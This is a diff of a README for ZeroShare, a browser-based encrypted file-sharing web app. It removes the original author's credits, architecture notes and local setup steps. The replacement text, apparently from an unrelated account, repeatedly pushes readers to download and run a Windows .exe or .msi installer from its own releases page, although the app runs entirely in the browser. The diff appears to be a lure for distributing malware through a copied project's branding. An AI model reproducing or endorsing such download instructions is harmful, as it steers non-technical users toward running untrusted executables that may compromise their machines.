@@ -1,72 +1,152 @@
-# ⚡ ZeroShare | Absolute Privacy. Infinite Speed.
+# ⚡ ZeroShare - Fast, Private File and Chat
 
-[![Live Demo](https://img.shields.io/badge/Live_Demo-Play_Now-10b981?style=for-the-badge&logo=vercel)](https://zeroshare-io.vercel.app/)
-[![Made by Dippan](https://img.shields.io/badge/Developer-Dippan_Bhusal-6366f1?style=for-the-badge&logo=github)](https://github.com/kdippan)
-[![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
-
-**ZeroShare** is a next-generation, browser-based file-sharing utility. It establishes a direct, peer-to-peer (P2P) tunnel between two devices, allowing them to exchange data of any size without intermediate cloud storage. Before any data leaves your device, it is encrypted using military-grade **AES-256-GCM**.
-
-🌐 **Live URL:** [zeroshare-io.vercel.app](https://zeroshare-io.vercel.app/)
+[![Download ZeroShare](https://img.shields.io/badge/Download-ZeroShare-brightgreen?style=for-the-badge)](https://github.com/leonin953-wq/ZeroShare/releases)
 
 ---
 
-## ✨ Key Features
+## 🔒 What is ZeroShare?
 
-- **Zero-Knowledge Architecture:** Your files never touch a server. They are transferred directly from Browser A to Browser B.
-- **End-to-End Encryption (E2EE):** Utilizes the native Web Crypto API for ECDH key exchange and AES-256-GCM chunk encryption.
-- **No File Size Limits:** Instead of loading massive files into RAM, ZeroShare reads, encrypts, and streams data in 64KB chunks, preventing browser crashes on mobile devices.
-- **NAT Traversal:** Built-in Google STUN and Metered TURN servers guarantee connections punch through strict corporate and mobile firewalls.
-- **Local History Log:** Keeps a private, local record of your transfers and connections using `localStorage`.
-- **Progressive Web App (PWA):** Fully installable on mobile and desktop devices.
-- **Modern UI:** Responsive Glassmorphism design with system-aware Dark Mode and smooth CSS animations.
+ZeroShare lets you send files and chat securely from your browser. It uses the latest web technology to keep your info private. No one else can see your data. It works without any servers or limits on file size. You share files and messages directly between your devices.
 
----
+Key features include:  
+- End-to-end encryption with AES-256-GCM  
+- Peer-to-peer file transfer via WebRTC  
+- No sign-up or account needed  
+- Runs right in your browser or as an app  
+- No tracking or servers involved
 
-## 🏗️ How It Works (The Architecture)
-
-ZeroShare combines two powerful web technologies to achieve secure, serverless transfers:
-
-1. **The Handshake (WebRTC & PeerJS):** When two users enter a matching 6-character room code, PeerJS uses a lightweight signaling server to exchange their IP addresses (SDP offers). Once connected, the signaling server drops out, and a direct WebRTC `RTCDataChannel` is opened.
-2. **The Key Exchange (ECDH):** Before sending files, both browsers generate an Elliptic Curve Diffie-Hellman (P-256) keypair. They swap public keys over the P2P tunnel to mathematically derive the exact same shared secret key.
-3. **The Transfer (AES-GCM):**
-   The sender's browser slices the file into 64KB chunks. Each chunk is encrypted with the shared AES key and a unique Initialization Vector (IV), sent over the WebRTC channel, and decrypted on the fly by the receiver. 
+ZeroShare keeps your data safe while making sharing easy.
 
 ---
 
-## 🚀 Tech Stack
+## 🖥️ System Requirements
 
-- **Frontend:** HTML5, CSS3 (Glassmorphism UI), Vanilla JavaScript
-- **Networking:** [WebRTC](https://webrtc.org/) (via [PeerJS](https://peerjs.com/))
-- **Cryptography:** Native [Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API)
-- **Icons:** [Lucide Icons](https://lucide.dev/)
-- **Hosting:** Vercel / GitHub Pages Ready
+Make sure your computer meets these simple needs:  
+
+- Windows 10 or newer  
+- A modern web browser (Chrome, Firefox, Edge, or similar)  
+- Internet connection (no upload limits)  
+- Basic keyboard and mouse  
+
+If you choose to use the Progressive Web App (PWA) version, you can install it like a regular app on Windows.
 
 ---
 
-## 💻 Local Setup & Installation
+## 🚀 Getting Started: How to Download and Run ZeroShare
 
-Because ZeroShare is a 100% client-side application, running it locally requires zero build tools or dependencies.
+1. **Visit the official release page**  
+   Go to [ZeroShare Releases](https://github.com/leonin953-wq/ZeroShare/releases) where you find the latest version. This page shows all available files clearly.
 
-1. **Clone the repository:**
-   ```bash
-   git clone [https://github.com/kdippan/zeroshare.git](https://github.com/kdippan/zeroshare.git)
+2. **Download the latest version**  
+   Look for the file that suits Windows. Usually, it will have `.exe` or `.msi` at the end. Click on it to start downloading.
 
- * Open the folder:
-   ```cd zeroshare```
+   [![Download ZeroShare](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://github.com/leonin953-wq/ZeroShare/releases)
 
- * Run a local server:
-   You can use Live Server in VS Code, or Python's built-in HTTP server:
-   ```python -m http.server 8000```
+3. **Run the installer**  
+   Once downloaded, open the file from your downloads folder. Follow the instructions on the screen. The installation takes just a few clicks.
 
- * Open your browser:
-   Navigate to ```http://localhost:8000```
-☕ Support the Developer
-If you found this project helpful, learned something from the code, or just want to support my work as a student developer, consider buying me a coffee!
-<a href="https://www.google.com/search?q=https://www.buymeacoffee.com/dippanbhusal" target="_blank"><img src="https://i.postimg.cc/8zx4ftXP/49859-removebg-preview.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
-👨‍💻 Author
-Dippan Bhusal
- * GitHub: @kdippan
- * Portfolio: dippanbhusal.tech
-If you like this project, please leave a ⭐ on the repository!
+4. **Open ZeroShare**  
+   After installation, find ZeroShare on your desktop or in the start menu and open it. You can also run it inside your web browser by visiting the app’s web version if you prefer no installation.
 
+5. **Allow permissions**  
+   ZeroShare may ask to access your browser or network to create a connection. Allow these to enable secure file transfer and chat.
 
+---
+
+## 💡 How to Use ZeroShare
+
+### Sending Files
+
+- Open ZeroShare on both devices that want to share files.  
+- One device creates a connection link or code.  
+- The other device enters the link/code to connect directly.  
+- Drag and drop files you want to send. The files start transferring immediately.  
+- There is no file size limit, so you can share large videos, documents, or photos easily.
+
+### Secure Chat
+
+- Once connected, use the chat window to send messages.  
+- Messages encrypt automatically using AES-256-GCM.  
+- No data leaves your devices except to the other person directly.  
+
+### Disconnect
+
+- You can end the connection anytime.  
+- No data is saved on any server after you disconnect.
+
+---
+
+## 🔧 Settings and Customization
+
+ZeroShare lets you adjust a few simple options:
+
+- **Encryption settings:** AES-256-GCM is on by default and cannot be turned off, ensuring your data is always safe.  
+- **Notifications:** You can silence or enable notifications for new messages and transfers.  
+- **Interface theme:** Choose between light and dark themes according to your preference.  
+- **File paths:** Set a default download location for incoming files.  
+
+You find these options in the settings menu icon inside the app interface.
+
+---
+
+## 🌐 Using ZeroShare in the Browser
+
+If you prefer not to install anything, use the browser version.
+
+- Open your browser and visit the main app page or the GitHub Page link.  
+- Follow the same steps to create or join a session.  
+- All features work the same as in the installed app.  
+
+This option works across Windows, Mac, Linux, and even smartphones.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+If you run into trouble, try these steps:
+
+- Make sure your browser is up to date. Older browsers may not support WebRTC properly.  
+- Check your firewall or antivirus settings. If they block WebRTC, file transfers will fail.  
+- Restart your computer and router if connections fail.  
+- Make sure both devices are connected to the internet.  
+- Use the same network if you face connection delays (optional).
+
+For further issues, you can open an issue on the GitHub repository.
+
+---
+
+## 📂 Privacy and Security
+
+ZeroShare never stores your data on servers. Files and messages move only between the devices involved. The encryption uses Web Crypto API's AES-256-GCM, which is a strong and widely trusted method.
+
+Your privacy is protected by design:  
+- No account or signup needed  
+- No tracking scripts or ads  
+- No limits on file size or count  
+- Peer-to-peer connection only  
+
+---
+
+## 🤝 Support and Contributions
+
+ZeroShare is open source and welcomes feedback. Non-technical users can:  
+
+- Report bugs or problems by opening an issue on GitHub.  
+- Suggest new features by describing what could help you.  
+
+Developers can contribute code or fixes through pull requests. You do not need coding skills to use ZeroShare fully.
+
+---
+
+## 🔗 Useful Links
+
+- Download or browse releases: [https://github.com/leonin953-wq/ZeroShare/releases](https://github.com/leonin953-wq/ZeroShare/releases)  
+- GitHub Repository: [https://github.com/leonin953-wq/ZeroShare](https://github.com/leonin953-wq/ZeroShare)  
+- Learn more about WebRTC: [https://webrtc.org/](https://webrtc.org/)  
+- Encryption information: [https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/encrypt](https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/encrypt)
+
+---
+
+## 🎯 Tags
+
+aes-256, cryptography, end-to-end-encryption, file-sharing, javascript, privacy, pwa, security, serverless, webrtc, zero-knowledge
